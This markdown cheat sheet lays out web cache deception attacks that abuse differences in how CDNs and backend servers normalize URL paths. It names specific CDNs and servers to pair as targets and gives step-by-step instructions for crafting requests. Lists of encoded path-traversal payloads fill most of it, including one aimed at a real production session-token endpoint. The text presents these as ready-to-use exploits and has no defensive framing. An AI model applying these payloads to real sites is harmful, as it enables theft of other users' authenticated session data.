# Advanced Cache Deception Methodology

## 1. Exploiting Static Directories & Files with Delimiters

### Overview
This technique targets scenarios where the **CDN normalizes the path** but the **backend server uses delimiters** and does **not normalize**. 

### Step-by-Step:

1. **Identify CDN**:
   - Target CDNs that **normalize paths**:
     - Amazon CloudFront
     - Microsoft Azure
     - Imperva CDN

2. **Identify Backend Server**:
   - Look for backend servers that support **delimiters** and do **not normalize** the path:
     - Apache
     - Gunicorn
     - Puma

3. **Craft the Payload**:
   ```http
   GET /<Dynamic_Resource><Delimiter><Encoded_Dot_Segment><Static_Directory>
   ```
   - Example: 
     ```http
     GET /login??..;/static/logo.png HTTP/1.1
     ```

---

## 2. Exploiting Static Directories & Files with Normalization

### Overview
This technique applies when the **CDN does NOT normalize** the path, but the **backend server does**.

### Step-by-Step:

1. **Identify CDN**:
   - Target CDNs that **do NOT normalize paths**:
     - Cloudflare
     - Google Cloud CDN
     - Fastly

2. **Identify Backend Server**:
   - Look for servers that **normalize paths**:
     - NGINX
     - IIS
     - OpenLiteSpeed

3. **Craft the Payload**:
   ```http
   GET /<Static_Directory><Encoded_Dot_Segment><Dynamic_Resource>
   ```
   - Example:
     ```http
     GET /static/%2e%2e/login HTTP/1.1
     ```
### test using this
```x%2F..%2F``` if any webs give same response then try this 


---

## Diagrams

### Identifying CDN
```
User --> CDN Provider --> Backend Server
            |
            |-- Check HTTP Headers / CNAME / Response Behavior
```

### Identifying Backend Server
```
User --> CDN --> Backend Server
                      |
                      |-- Use response signatures, headers, error messages
```

---

### Notes
- Use tools like `curl`, `Wappalyzer`, and browser DevTools to identify technologies.
- Always verify caching behavior using `Cache-Control`, `Age`, and `X-Cache` headers.
- Try multiple encoding formats (`%2e`, `%2f`, double encoding) to test variations.

> These methods rely on the inconsistency between how CDNs and backend servers handle URLs—understanding both ends is key to a successful cache deception exploit.

---

## Additional Payload Examples

### 1. Exploiting Static Directories & Files with Delimiters

**Payloads:**
```
/myAccount$/%2F..%2Fstatic/any
/myAccount$/..%2Fstatic/any
/myAccount$%2F..%2Fstatic/any
/myAccount%252F..%252Fstatic/any  # Double encoding
```

---

### 2. Exploiting Static Directories & Files with Normalization

**Example URL:**
```
https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123
```

**Payloads:**
```
static/%2F..%2Fapi/auth/session?cachebuster=123
static%2F..%2Fapi/auth/session?cachebuster=123
static/..%2Fapi/auth/session?cachebuster=123
static%252F..%252Fapi/auth/session?cachebuster=123  # Double encoding
```
